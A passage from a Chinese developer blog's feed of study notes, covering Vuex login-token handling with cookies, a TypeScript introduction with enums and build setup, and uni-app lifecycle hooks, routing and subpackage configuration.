USERLOGIN(state,token)&#123;</span><br><span class="line">            state.token = token</span><br><span class="line">        &#125;,</span><br><span class="line">        //清除token</span><br><span class="line">        clearToken(state) &#123;</span><br><span class="line">            state.token = &#x27;&#x27;</span><br><span class="line">            Cookie.remove(&#x27;token&#x27;) // 通过传入token的名称进行一个清空</span><br><span class="line">        &#125;,</span><br><span class="line">        // 获取当前的token</span><br><span class="line">        getToken(state) &#123;</span><br><span class="line">            // 如果当前的缓存中有token，那就直接获取；如果没有就从state中获取，下面进行容错处理</span><br><span class="line">            state.token = state.token || Cookie.get(&#x27;token&#x27;)</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    actions : &#123;</span><br><span class="line">        //登录,设置token</span><br><span class="line">        async userLogin(&#123;commit&#125;,data)&#123;</span><br><span class="line">            let result = await reqUserLogin(data)//返回的data中就有token</span><br><span class="line">            //服务器下发token</span><br><span class="line">            if(result.code == 200)&#123;</span><br><span class="line">                commit(&quot;USERLOGIN&quot;,result.data.token);</span><br><span class="line">                Cookie.set(&#x27;token&#x27;, result.data.token) // 第一个是cookie的名称，第二个是传入的值。然后再Cookie中生成了一条数据。</span><br><span class="line">                return &#x27;ok&#x27;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return Promise.reject(new Error(&#x27;failed&#x27;))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        //用户注册</span><br><span class="line">        async reqUserAdd(&#123;commit&#125;,user)&#123;</span><br><span class="line">            let result = await reqUserAdd(user)</span><br><span class="line">            if(result.code == 200)&#123;</span><br><span class="line">                return &#x27;ok&#x27;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return Promise.reject(new Error(&#x27;failed&#x27;))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        //用户登出</span><br><span class="line">        async userLoginOut(&#123;commit&#125;)&#123;</span><br><span class="line">            commit(&#x27;clearToken&#x27;);</span><br><span class="line">            return &#x27;ok&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>之后我们的请求都需要添加首次登录拿到的token，而且需要在退出登录后清除token保证安全</p><h3 id="3-查看token"><a href="#3-查看token" class="headerlink" title="3.查看token"></a>3.查看token</h3><p>我们在浏览器的network选项卡里面找到发送的请求</p><p><img src="https://s2.loli.net/2022/09/04/LcKYtuNykilQ3Ad.png" alt="token.png"></p><p>这个Authorization中就是我们的token，对于拦截器代码是：<code>config.headers.common[&#39;Authorization&#39;] = Cookies.get(&#39;token&#39;) </code></p><p>但是如果后端是直接在request headers中找token，拦截器代码就是：<code>config.headers.Token = Cookies.get(&#39;token&#39;)</code></p><p>我们的头部会多出一个Token字段，里面就是我们的token</p><h2 id="8-请求"><a href="#8-请求" class="headerlink" title="8.请求"></a>8.请求</h2><p>其实我们常用的请求分为了四类：post，del，put，get对应了增删改查四种操作</p><p>除了get的数据在header中，其他四个的数据都在body里面</p><p>主要注意和后端协商请求方式，注意接口调试</p><h2 id="9-测试"><a href="#9-测试" class="headerlink" title="9.测试"></a>9.测试</h2><h3 id="1-页面抖动"><a href="#1-页面抖动" class="headerlink" title="1.页面抖动"></a>1.页面抖动</h3><p>测试的时候需要一个很诡异的页面抖动：</p><p><img src="D:\新建文件夹\文件\GitHub\pic\收发系统开发日志\抖动代码.png" alt="抖动代码"></p><p>原本的width是100%，但是100%会出现页面右侧滑动栏一直抖动的问题</p><p>在百度一下之后发现可能是这个原因</p><p><img src="D:\新建文件夹\文件\GitHub\pic\收发系统开发日志\抖动原因.png" alt="抖动原因"></p><p>也就是说刚刚好盒子大小和电脑屏幕一样大小，右侧的滚动条不知道改不改出现，产生了出现和不出现的叠加态（bushi）</p><p>总的来说，这个时候把盒子的大小调小一点就可以了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TypeScript</title>
    <link href="/2022/07/13/TypeScript/"/>
    <url>/2022/07/13/TypeScript/</url>
    
    <content type="html"><![CDATA[<h1 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h1><h2 id="1-什么是typescript"><a href="#1-什么是typescript" class="headerlink" title="1.什么是typescript"></a>1.什么是typescript</h2><h3 id="1-1-what"><a href="#1-1-what" class="headerlink" title="1.1 what"></a>1.1 what</h3><p>typescript的标语是—始于JavaScript，终于JavaScript</p><p>因为js一开始是作为脚本语言开发的，所以没有大规模应用程序的编写能力，也没有开发者工具的支持</p><p>为了克服这些不足，微软公司发明了typescript—一门专为开发大规模JavaScript应用程序而设计的编程语言。</p><p>typescript是JavaScript的超集，合格的JavaScript程序也是合格的typescript程序。但是typescript代码不能直接运行，它需要预先编译为JavaScript代码然后才能运行</p><h3 id="1-2-why"><a href="#1-2-why" class="headerlink" title="1.2 why"></a>1.2 why</h3><p>2014年的typescript发行以来，typescript使用者保持高数增长。</p><p>typescript吸引人的地方有：</p><p>1.能更早地发现代码中的错误</p><p>2.能够帮助提高生产力</p><p>3.支持js的最新特性并使用了js语言相同的语法和语义</p><h2 id="2-安装typescript"><a href="#2-安装typescript" class="headerlink" title="2.安装typescript"></a>2.安装typescript</h2><h3 id="1-安装npm"><a href="#1-安装npm" class="headerlink" title="1.安装npm"></a>1.安装npm</h3><p>在安装typescript之前我们需要安装npm工具，也就是node.js</p><p>安装成功之后 输入 <code>node -v</code>就可以参看版本</p><h3 id="2-安装typescript-1"><a href="#2-安装typescript-1" class="headerlink" title="2.安装typescript"></a>2.安装typescript</h3><p>在vscode中打开控制台，输入<code>npm install -g typescript</code> 安装typescript</p><p>安装成功后输入<code>tsc --version</code>查看版本</p><h2 id="3-hello-world"><a href="#3-hello-world" class="headerlink" title="3.hello-world"></a>3.hello-world</h2><p>接下来我们创建一个ts程序</p><p>打开vscode新建一个写ts代码的文件夹</p><h3 id="1-新建tsconfig-json文件"><a href="#1-新建tsconfig-json文件" class="headerlink" title="1.新建tsconfig.json文件"></a>1.新建tsconfig.json文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;compilerOptions&quot;: &#123;</span><br><span class="line">        //启用严格的类型检查</span><br><span class="line">        &quot;strict&quot;: true,</span><br><span class="line">        //js的输出版本</span><br><span class="line">        &quot;target&quot;: &quot;es5&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-新建hello-world-ts文件"><a href="#2-新建hello-world-ts文件" class="headerlink" title="2.新建hello-world.ts文件"></a>2.新建hello-world.ts文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const greeting = &#x27;hello world&#x27;</span><br><span class="line"></span><br><span class="line">console.log(greeting);</span><br></pre></td></tr></table></figure><p>然后使用 “Ctrl + Shift + B”或者菜单栏选择 “Terminal -&gt; Run Build Task”打开构建任务面板</p><p>选择”tsc: build - tsconfig.json”来编译ts程序</p><p>编译完成后会出现一个hello-world.js的文件，输入<code>node hello-world.js</code>执行js文件</p><h3 id="3-设置默认值构建任务"><a href="#3-设置默认值构建任务" class="headerlink" title="3.设置默认值构建任务"></a>3.设置默认值构建任务</h3><p>使用 “Ctrl + Shift + B”打开面板，点击齿轮，会出现一个task.json文件</p><p>修改该文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;version&quot;: &quot;2.0.0&quot;,</span><br><span class="line">&quot;tasks&quot;: [</span><br><span class="line">&#123;</span><br><span class="line">&quot;type&quot;: &quot;typescript&quot;,</span><br><span class="line">&quot;tsconfig&quot;: &quot;tsconfig.json&quot;,</span><br><span class="line">&quot;problemMatcher&quot;: [</span><br><span class="line">&quot;$tsc&quot;</span><br><span class="line">],</span><br><span class="line">&quot;group&quot;: &#123;</span><br><span class="line">&quot;kind&quot;: &quot;build&quot;,</span><br><span class="line">&quot;isDefault&quot;: true</span><br><span class="line">&#125;,</span><br><span class="line">&quot;label&quot;: &quot;tsc: 构建 - tsconfig.json&quot;</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们使用 “Ctrl + Shift + B”就会默认编译</p><h2 id="4-语言基础"><a href="#4-语言基础" class="headerlink" title="4.语言基础"></a>4.语言基础</h2><p>因为ts是js的超集，所以ts支持var，let，const进行变量定义。这三种声明的使用方法与js一样</p><p>数据类型有8种：（7种原始数据类型）</p><p>undefined，Null，Boolean，String，Number，Symbol，Object，BigInt</p><p>这里特别说明一下Symbol和BigInt</p><p>Symbol是es6新引入的原始类型，Symbol值唯一而且不可改变，通过Symbol()这个函数创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const sym = Symbol();</span><br><span class="line">const obj = &#123; [sym]: &#x27;some value&#x27; &#125;;</span><br><span class="line">obj[sym];//some value</span><br></pre></td></tr></table></figure><p>js中内置了Well-Known Symbol常量，一共11个</p><p>BigInt类型能够表示任意精度的整数，尤其是大于<code>2^53 - 1</code>的整数</p><p>BigInt要求在创建整数后加入一个n</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const unit = 1n;</span><br><span class="line">//或者</span><br><span class="line">const unit = BigInt(1)</span><br></pre></td></tr></table></figure><p>BIgInt不能和Number混合运算但是可以比较，但是严格相等比较情况下BigInt和Number永远不相等</p><h3 id="1-类型注解"><a href="#1-类型注解" class="headerlink" title="1.类型注解"></a>1.类型注解</h3><p>用于明确标识的类型，<strong>可选项</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const greeting: string = &#x27;Hello, World!&#x27;;</span><br></pre></td></tr></table></figure><p>而函数的类型注解也是类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function foo(message: string): void &#123;</span><br><span class="line">console.log(message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-枚举类型"><a href="#2-枚举类型" class="headerlink" title="2.枚举类型"></a>2.枚举类型</h3><p>一种原始类型，使用enum来定义，使用enum定义Season枚举类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enum Season &#123;</span><br><span class="line">Spring,</span><br><span class="line">Summer,</span><br><span class="line">Fall,</span><br><span class="line">Winter,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数值型枚举</p><p>像上面的代码其实默认为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enum Season &#123;</span><br><span class="line">Spring = 0,//枚举值默认从0开始</span><br><span class="line">Summer = 1,</span><br><span class="line">Fall = 2,</span><br><span class="line">Winter = 3,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未标注枚举成员的枚举值等于上一个成员的枚举值+1</p><p>我们可以通过访问对象的方式访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const season: Season = Season.Summer</span><br><span class="line">const season: number = Season.Summer//1 </span><br></pre></td></tr></table></figure><p>字符串枚举</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enum Season &#123;</span><br><span class="line">Spring = &#x27;spring&#x27;,</span><br><span class="line">Summer = &#x27;summber&#x27;,</span><br><span class="line">Fall = &#x27;fall&#x27;,</span><br><span class="line">Winter = &#x27;winter&#x27;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用枚举类型赋值给字符串变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const dir: string = Season.summer//dir = &#x27;summer&#x27;</span><br></pre></td></tr></table></figure><p>异构枚举类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enum Color &#123;</span><br><span class="line">Black = 0,</span><br><span class="line">White = &#x27;White&#x27;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uni-app</title>
    <link href="/2022/07/05/uni-app/"/>
    <url>/2022/07/05/uni-app/</url>
    
    <content type="html"><![CDATA[<h1 id="uni-app"><a href="#uni-app" class="headerlink" title="uni-app"></a>uni-app</h1><h2 id="1-uni-app介绍"><a href="#1-uni-app介绍" class="headerlink" title="1.uni-app介绍"></a>1.uni-app介绍</h2><p>uni-app 是使用 Vue.js 开发跨平台应用的前端框架，开发者编写一套代码，可编译到iOS、Android、H5、小程序等多个平台。</p><p>一个通用的技术栈，支持vue语法，微信小程序API</p><p><img src="https://s2.loli.net/2022/07/14/g2riy58tUNSndTB.png" alt="uniapp-frame.png"></p><h2 id="2-生命周期钩子"><a href="#2-生命周期钩子" class="headerlink" title="2.生命周期钩子"></a>2.生命周期钩子</h2><h3 id="1-页面生命周期钩子"><a href="#1-页面生命周期钩子" class="headerlink" title="1.页面生命周期钩子"></a>1.页面生命周期钩子</h3><h4 id="1-onLoad"><a href="#1-onLoad" class="headerlink" title="1.onLoad"></a>1.onLoad</h4><p>页面加载的时候，只会触发一次。因为tabbar加载过的页面就存在了内存中，切换回来的时候只会触发onShow不会触发onLoad</p><h4 id="2-onPageNotFound"><a href="#2-onPageNotFound" class="headerlink" title="2.onPageNotFound"></a>2.onPageNotFound</h4><p>找不到指定页面的时候</p><h4 id="3-onShow"><a href="#3-onShow" class="headerlink" title="3.onShow"></a>3.onShow</h4><p>页面展示出来之后，会触发多次</p><p>这三个可以实现我们的404 not fount和跳转</p><p>1.我们右键点击pages，选择新建页面，页面命名为404</p><p>在我们创建页面之后可以在<code>pages.json</code>中看到页面的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">            &quot;path&quot; : &quot;pages/404/404&quot;,</span><br><span class="line">            &quot;style&quot; :                                                                                    </span><br><span class="line">            &#123;</span><br><span class="line">            //页面主题，显示在页面的正上方</span><br><span class="line">                &quot;navigationBarTitleText&quot;: &quot;页面走丢了&quot;,</span><br><span class="line">                &quot;enablePullDownRefresh&quot;: false</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>2.然后在<code>App.vue</code>中就可以加入onPageNotFound的钩子，就可以实现页面走丢时候的跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">onPageNotFound() &#123;</span><br><span class="line">//页面跳转</span><br><span class="line">uni.navigateTo(&#123;</span><br><span class="line">url:&#x27;./pages/404/404&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.我们在新建的404页面中加入2秒后跳转回index页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">onLoad() &#123;</span><br><span class="line">//两秒后跳转至index</span><br><span class="line">let timer = setTimeout(()=&gt;&#123;</span><br><span class="line">clearTimeout(timer)</span><br><span class="line">uni.navigateTo(&#123;</span><br><span class="line">url:&#x27;/pages/index/index&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;,2000)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>回到微信开发者工具中，在编译模式中修改启动页面为一个没有的页面，就会触发onPageNotFount钩子和一系列功能。</p><h4 id="4-onPullDownRefresh"><a href="#4-onPullDownRefresh" class="headerlink" title="4.onPullDownRefresh"></a>4.onPullDownRefresh</h4><p>下拉刷新时触发</p><p>但是使用这个钩子需要打开配置下拉刷新配置</p><p>在pages.json中：<code>enablePullDownRefresh 调为 true</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;path&quot;: &quot;pages/index/index&quot;,</span><br><span class="line">&quot;style&quot;: &#123;</span><br><span class="line">&quot;navigationBarTitleText&quot;: &quot;uni-app&quot;,</span><br><span class="line">&quot;enablePullDownRefresh&quot;: true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在该页面中加入钩子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">onPullDownRefresh() &#123;</span><br><span class="line">console.log(&#x27;页面刷新&#x27;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>我们还可以使用<code>uni.stopPullDownRefresh()</code>方法停止刷新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">onPullDownRefresh() &#123;</span><br><span class="line">console.log(&#x27;页面刷新&#x27;)</span><br><span class="line">setTimeout(()=&gt;&#123;</span><br><span class="line">uni.stopPullDownRefresh()</span><br><span class="line">&#125;,1000)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>同样，我们还有个方法触发刷新-<code>uni.startPullDownRefresh()</code>，执行这个函数就相当于我们的下拉刷新动作，会触发我们的<code>onPullDownRefresh</code>钩子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">Refresh()&#123;</span><br><span class="line">uni.startPullDownRefresh()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-onTabItemTab"><a href="#5-onTabItemTab" class="headerlink" title="5.onTabItemTab"></a>5.onTabItemTab</h4><p>点击页面导航框时触发</p><h4 id="6-onShareAppMessage"><a href="#6-onShareAppMessage" class="headerlink" title="6.onShareAppMessage"></a>6.onShareAppMessage</h4><p>点击分享时候触发</p><p>这些都是一些很基本的钩子，更多的钩子请到官方文档里面查看</p><h4 id="7-onReady"><a href="#7-onReady" class="headerlink" title="7.onReady"></a>7.onReady</h4><p>页面初次渲染时加载，只触发一次</p><h4 id="8-onHide"><a href="#8-onHide" class="headerlink" title="8.onHide"></a>8.onHide</h4><p>和onShow对应，页面切换回来的时候触发，会触发多次</p><h4 id="9-onReachBottom"><a href="#9-onReachBottom" class="headerlink" title="9.onReachBottom"></a>9.onReachBottom</h4><p>当页面到达底部时触发钩子，可以在pages.json中设置距离底部多少时触发（onReachBottomDistance 唯一单位为px）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//生命周期钩子函数</span><br><span class="line">onReachBottom() &#123;</span><br><span class="line">console.log(&quot;到达底部了&quot;)</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//pages.json中的配置项</span><br><span class="line">&#123;</span><br><span class="line">          &quot;path&quot; : &quot;pages/style/style&quot;,</span><br><span class="line">          &quot;style&quot; :                                                                                    </span><br><span class="line">          &#123;</span><br><span class="line">              &quot;navigationBarTitleText&quot;: &quot;&quot;,</span><br><span class="line">              &quot;enablePullDownRefresh&quot;: false,</span><br><span class="line">&quot;onReachBottomDistance&quot;: 1</span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="2-应用的生命周期"><a href="#2-应用的生命周期" class="headerlink" title="2.应用的生命周期"></a>2.应用的生命周期</h3><p>这些钩子一般都在App.vue中</p><h4 id="1-onLunch"><a href="#1-onLunch" class="headerlink" title="1.onLunch"></a>1.onLunch</h4><p>应用初始化时，最先执行</p><h4 id="2-onShow"><a href="#2-onShow" class="headerlink" title="2.onShow"></a>2.onShow</h4><p>应用启动时，可以触发多次，由后台切换到前台时触发</p><h4 id="3-onHide"><a href="#3-onHide" class="headerlink" title="3.onHide"></a>3.onHide</h4><p>应用由前台转到后台时，于onShow对应，也可以触发多次</p><h4 id="4-onError"><a href="#4-onError" class="headerlink" title="4.onError"></a>4.onError</h4><p>应用出错时触发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//生命周期</span><br><span class="line">onLaunch: function() &#123;</span><br><span class="line">console.log(&#x27;App Launch&#x27;)</span><br><span class="line">&#125;,</span><br><span class="line">onShow: function() &#123;</span><br><span class="line">console.log(&#x27;App Show&#x27;)</span><br><span class="line">&#125;,</span><br><span class="line">onHide: function() &#123;</span><br><span class="line">console.log(&#x27;App Hide&#x27;)</span><br><span class="line">&#125;,</span><br><span class="line">onError(err) &#123;</span><br><span class="line">console.log(&quot;出错了&quot;+err)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="3-路由配置和跳转"><a href="#3-路由配置和跳转" class="headerlink" title="3.路由配置和跳转"></a>3.路由配置和跳转</h2><p>我们之前实现页面跳转是通过<code>navigateTo</code>进行跳转，这种跳转叫做API跳转。我们还有其他的路由跳转方式</p><h3 id="1-navigate标签跳转"><a href="#1-navigate标签跳转" class="headerlink" title="1.navigate标签跳转"></a>1.navigate标签跳转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 实现组件式的跳转 --&gt;</span><br><span class="line">&lt;navigator url=&quot;/pages/404/404&quot;&gt;404页面&lt;/navigator&gt;</span><br></pre></td></tr></table></figure><h3 id="2-底部导航栏进行跳转"><a href="#2-底部导航栏进行跳转" class="headerlink" title="2.底部导航栏进行跳转"></a>2.底部导航栏进行跳转</h3><p>要实现像微信一样的底部导航栏，我们首先需要在<code>pages.json</code>里面进行配置。加入<code>tabBar</code>选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&quot;tabBar&quot;: &#123;</span><br><span class="line">&quot;color&quot;: &quot;#7a7e83&quot;,</span><br><span class="line">&quot;selectedColor&quot;: &quot;#3cc51f&quot;,</span><br><span class="line">&quot;borderStyle&quot;: &quot;black&quot;,</span><br><span class="line">&quot;backgroundColor&quot;: &quot;#ffffff&quot;,</span><br><span class="line">&quot;list&quot;: [</span><br><span class="line">&#123;</span><br><span class="line">&quot;pagePath&quot;: &quot;pages/index/index&quot;,</span><br><span class="line">&quot;iconPath&quot;: &quot;static/logo.png&quot;,</span><br><span class="line">&quot;selectedIconPath&quot;: &quot;static/logo.png&quot;,</span><br><span class="line">&quot;text&quot;: &quot;微信&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&quot;pagePath&quot;: &quot;pages/List/List&quot;,</span><br><span class="line">&quot;iconPath&quot;: &quot;static/logo.png&quot;,</span><br><span class="line">&quot;selectedIconPath&quot;: &quot;static/logo.png&quot;,</span><br><span class="line">&quot;text&quot;: &quot;通讯录&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&quot;pagePath&quot;: &quot;pages/Share/Share&quot;,</span><br><span class="line">&quot;iconPath&quot;: &quot;static/logo.png&quot;,</span><br><span class="line">&quot;selectedIconPath&quot;: &quot;static/logo.png&quot;,</span><br><span class="line">&quot;text&quot;: &quot;朋友圈&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&quot;pagePath&quot;: &quot;pages/Me/Me&quot;,</span><br><span class="line">&quot;iconPath&quot;: &quot;static/logo.png&quot;,</span><br><span class="line">&quot;selectedIconPath&quot;: &quot;static/logo.png&quot;,</span><br><span class="line">&quot;text&quot;: &quot;我&quot;</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-getCurrentPages"><a href="#3-getCurrentPages" class="headerlink" title="3.getCurrentPages()"></a>3.getCurrentPages()</h3><p>这个方法可以获取当前页面栈信息</p><p>我们可以使用<code>console.log</code>打印出来</p><p>这个页面栈是以数组的形式进行进栈和出栈</p><h3 id="4-路由传参"><a href="#4-路由传参" class="headerlink" title="4.路由传参"></a>4.路由传参</h3><p>传参：可以通过url进行传参，？后加入参数的常见方式</p><p>接收参数：在onLoad(options)中options便可以取到参数</p><p>但是url是有长度限制的，如果长度超出，我们就要使用encode和decode进行处理</p><h3 id="5-分包配置"><a href="#5-分包配置" class="headerlink" title="5.分包配置"></a>5.分包配置</h3><p>为了提高小程序的加载速度，小程序开发商提出来分包的概念</p><p>一个程序分为主包和分包：</p><p>主包就是我们的pages页面，小程序启动时就会加载</p><p>分包就是我们需要时才加载</p><p>分包页面我们需要加入一个新的目录<code>subpages</code></p><p>在subpages下加入我们的news页面</p><p>然后我们需要在pages.json中加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//分包配置</span><br><span class="line">&quot;subPackages&quot;: [</span><br><span class="line">&#123;</span><br><span class="line">&quot;root&quot;: &quot;subpages&quot;,</span><br><span class="line">&quot;pages&quot;: [</span><br><span class="line">&#123;</span><br><span class="line">&quot;path&quot;: &quot;news/news&quot;,</span><br><span class="line">&quot;style&quot;: &#123;</span><br><span class="line">&quot;navigationBarTitleText&quot;: &quot;新闻中心&quot;,</span><br><span class="line">&quot;enablePullDownRefresh&quot;: true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>需要注意的是分包页面也是默认加入到我们的主包pages页面中的，所以我们还需要把主包页面中的分包页面删除。</p><h2 id="4-组件"><a href="#4-组件" class="headerlink" 